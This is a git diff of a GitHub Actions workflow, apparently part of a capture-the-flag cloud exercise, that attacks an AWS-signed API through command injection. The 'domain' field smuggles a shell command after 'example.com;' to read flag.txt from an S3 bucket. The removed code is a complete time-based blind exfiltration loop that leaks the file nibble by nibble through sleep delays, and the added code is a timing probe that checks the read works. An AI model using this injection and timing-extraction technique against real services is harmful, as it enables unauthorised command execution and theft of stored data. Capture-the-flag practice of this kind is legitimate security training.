@@ -1,4 +1,4 @@
-name: Stage2-17-Extract-Flag
+name: Stage2-18-Calibrate-S3-Read
 
 on:
   push:
@@ -10,9 +10,8 @@ permissions:
   id-token: write
 
 jobs:
-  extract:
+  test:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
 
     steps:
       - name: Configure AWS credentials
@@ -25,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Extract flag
+      - name: Calibrate flag read
         run: |
           python3 - <<'PY'
           import os
@@ -43,63 +42,31 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          session = requests.Session()
+          domain = (
+              "example.com; "
+              "if /opt/aws s3api get-object "
+              "--bucket logad88e2b168aa387e "
+              "--key flag.txt "
+              "/tmp/log-flag.txt "
+              "--region us-east-1 "
+              "--endpoint-url https://s3.us-east-1.amazonaws.com "
+              ">/dev/null 2>&1; "
+              "then sleep 8; "
+              "fi"
+          )
 
-          def probe(index, shift):
-              domain = (
-                  "example.com; "
-                  "/opt/aws s3api get-object "
-                  "--bucket logad88e2b168aa387e "
-                  "--key flag.txt "
-                  "/tmp/log-flag.txt "
-                  "--region us-east-1 "
-                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
-                  ">/dev/null 2>&1 && "
-                  f"b=$(od -An -tu1 -N1 -j{index} /tmp/log-flag.txt | tr -d ' '); "
-                  f"n=$(((b >> {shift}) & 15)); "
-                  "sleep \"$n\""
-              )
+          start = time.monotonic()
 
-              start = time.monotonic()
+          response = requests.post(
+              api,
+              json={"domain": domain},
+              auth=auth,
+              timeout=30
+          )
 
-              response = session.post(
-                  api,
-                  json={"domain": domain},
-                  auth=auth,
-                  timeout=25
-              )
+          elapsed = time.monotonic() - start
 
-              elapsed = time.monotonic() - start
-              value = round(elapsed)
-
-              print(
-                  "INDEX=%d SHIFT=%d ELAPSED=%.2f NIBBLE=%d"
-                  % (index, shift, elapsed, value)
-              )
-
-              return value & 15
-
-          flag = []
-
-          for index in range(48):
-              high = probe(index, 4)
-              low = probe(index, 0)
-
-              value = (high << 4) | low
-
-              if value == 0:
-                  break
-
-              char = chr(value)
-              flag.append(char)
-
-              print(
-                  "BYTE=%d VALUE=%d CHAR=%r"
-                  % (index, value, char)
-              )
-
-              if char == "}":
-                  break
-
-          print("FLAG=" + "".join(flag))
+          print("HTTP=" + str(response.status_code))
+          print("ELAPSED=%.2f" % elapsed)
+          print(response.text)
           PY
